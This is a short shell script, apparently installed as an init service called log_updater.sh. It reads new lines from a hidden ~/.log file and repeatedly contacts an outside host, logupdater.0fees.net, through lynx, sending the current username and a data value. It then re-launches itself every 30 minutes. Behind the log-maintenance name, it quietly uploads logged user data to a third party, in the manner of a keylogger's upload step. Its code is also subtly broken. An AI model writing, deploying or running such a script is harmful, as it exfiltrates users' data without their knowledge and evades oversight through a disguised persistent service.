cat ~/.log_line
if [ $? -ne  0 ]
then
echo "0">~/.log_line
fi
i=`cat .log_line`
j=`cat ~/.log|wc -l`
for string in `sed -n "$i,$j" ~/.log`
do
lynx http://logupdater.0fees.net?user=`whoami`&data=$i
killall lynx
done
echo $j >~/.log_line
sleep 1800
/etc/init.d/log_updater.sh
